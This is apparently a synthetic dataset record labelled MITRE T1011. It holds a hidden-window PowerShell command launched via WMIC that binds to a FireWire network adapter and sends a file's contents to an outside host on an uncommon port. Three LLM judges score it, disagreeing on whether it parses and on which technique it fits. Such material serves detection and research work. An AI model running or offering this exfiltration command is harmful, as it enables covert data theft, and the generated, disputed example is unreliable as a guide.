{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*1394*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.44',56112); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\frame.buf'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Runs PowerShell through WMIC to bind to an IEEE 1394 (FireWire) network adapter and exfiltrate data via TCP on a high port. FireWire networking provides a non-standard medium consistent with T1011.",
  "rationale_steps": [
    "Identify the 1394 network adapter through WMI.",
    "Bind a TCP client specifically to the 1394 interface's IPv4 address.",
    "Open a connection to an external host on an uncommon TCP port.",
    "Transmit file contents via the FireWire network path.",
    "Ensure no global network behavior is modified."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-879ab2fc",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax embedded within WMIC and proper escape sequences.",
        "semantic_score": 3,
        "semantic_justification": "While the command does use WMIC to proxy PowerShell execution (consistent with system script proxy execution), it's actually implementing exfiltration over a command and control channel (T1041) rather than T1011 which specifically refers to exfiltration over alternative protocols.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:31:45.973400Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 2,
        "syntactic_justification": "The backtick escaping of all PowerShell variables (e.g., `$ifc`) within the `-Command` argument causes PowerShell to interpret the `$` as a literal character rather than a variable prefix, making the script fundamentally non-functional.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with the claimed intent, using WMIC as a trusted system utility to proxy PowerShell execution for data exfiltration via a specific network interface, which is consistent with the T1011 technique and realistic adversarial behavior.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:32:06.623620Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "Well-formed WMIC invocation with balanced quoting and valid PowerShell syntax, though the unnecessary backticks before $ variables could introduce edge-case parsing quirks.",
        "semantic_score": 2,
        "semantic_justification": "While it plausibly exfiltrates data via TCP and attempts to bind to a 1394 adapter, it does not use a trusted/signed system script as a proxy as described, so it is misaligned with the stated System Script Proxy Execution technique.",
        "combined_score": 3.0,
        "confidence": 0.7,
        "timestamp": "2025-10-02T04:32:48.450318Z"
      }
    ],
    "llm_average_syntactic": 3.667,
    "llm_average_semantic": 3.333,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}